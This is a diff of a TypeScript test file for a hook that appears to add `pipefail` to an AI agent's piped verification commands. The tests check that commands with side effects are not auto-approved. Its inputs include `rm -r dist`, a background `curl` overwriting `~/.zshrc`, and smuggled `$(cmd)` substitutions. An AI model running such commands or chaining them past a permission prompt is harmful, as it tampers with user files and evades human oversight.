@@ -19,13 +19,14 @@ const PIPEFAIL_GATE = 'set -o pipefail; pnpm josh gate | tail -40'
 const PIPED_LISTING = 'git log --oneline -3 | head'
 const PIPED_ANSWER = 'pnpm josh review:brief --level-only | tail -1'
 const NO_VERIFICATION = 'ls -la'
+const PIPED_GREP = 'josh cspell:dot | grep -i error'
 
 describe('is_masked_verification', () => {
 	it.each([
 		PIPED_GATE_COMMAND,
 		'pnpm josh lint:related a.ts | head -20',
 		'cd /tmp/lane && pnpm josh test:unit | tail -5',
-		'josh cspell:dot | grep -i error',
+		PIPED_GREP,
 		// The alias is the same command, and it is derived from the command map rather than restated.
 		'pnpm josh ga | tail',
 		'pnpm josh gate | tail -40 | grep failed',
@@ -103,5 +104,64 @@ describe('runs_verification and keeps_verdict_intact', () => {
 		NO_VERIFICATION,
 	])('does not credit %j', (command) => {
 		expect(piped_verification.keeps_verdict_intact(command)).toBe(false)
+	})
+})
+
+// joshuafolkken/kit#3570: the commonest masking runs under `pipefail` instead of being refused.
+function bash(command: string): { name: string; input: Record<string, unknown> } {
+	return { name: 'Bash', input: { command, description: 'd' } }
+}
+
+describe('pipefail_input', () => {
+	it.each([
+		'pnpm josh lint:related 2>&1 | tail -5',
+		PIPED_GREP,
+		'pnpm josh lint:related | tail -3 && pnpm josh test:related | tail -3',
+	])('rewrites %j with the prefix, keeping the other fields', (command) => {
+		expect(piped_verification.pipefail_input(bash(command))).toStrictEqual({
+			command: `set -o pipefail; ${command}`,
+			description: 'd',
+		})
+	})
+
+	it.each([
+		// An early-exit filter: SIGPIPE under `pipefail` turns a pass into 141, and `head` cuts the verdict.
+		'pnpm josh lint:related | head -5',
+		'pnpm josh gate | grep -q failed',
+		'pnpm josh gate | grep -m 1 error',
+		// A listing beside the check is never put under a `pipefail` it was not written for.
+		'pnpm josh lint | tail -3 && git log | head',
+		// Anything beside the checks would ride the `allow` past its own permission prompt.
+		'pnpm josh lint:related | tail -3 && rm -r dist',
+		'cd /tmp && pnpm josh gate | tail -40',
+	])('leaves %j to the refusal', (command) => {
+		expect(piped_verification.pipefail_input(bash(command))).toBeUndefined()
+	})
+
+	it.each([PIPEFAIL_GATE, REDIRECTED_GATE, PIPED_LISTING])(
+		'rewrites nothing for %j, which masks no check',
+		(command) => {
+			expect(piped_verification.pipefail_input(bash(command))).toBeUndefined()
+		},
+	)
+
+	it('rewrites nothing for a tool other than Bash', () => {
+		const call = { name: 'Edit', input: { command: PIPED_GATE_COMMAND } }
+
+		expect(piped_verification.pipefail_input(call)).toBeUndefined()
+	})
+})
+
+// Syntax the chain cut and the unquoting cannot see would ride the `allow` past its permission prompt.
+describe('pipefail_input beside side-effect syntax', () => {
+	it.each([
+		'pnpm josh gate | tail & curl -so ~/.zshrc x',
+		'pnpm josh gate | tail > ~/.zshrc',
+		'pnpm josh gate | tail -n $(cmd)',
+		'pnpm josh gate | grep "$(cmd)"',
+		'pnpm josh gate | grep "`cmd`"',
+		'pnpm josh gate < /dev/null | tail',
+	])('leaves %j, whose syntax the cut cannot see, to the refusal', (command) => {
+		expect(piped_verification.pipefail_input(bash(command))).toBeUndefined()
 	})
 })
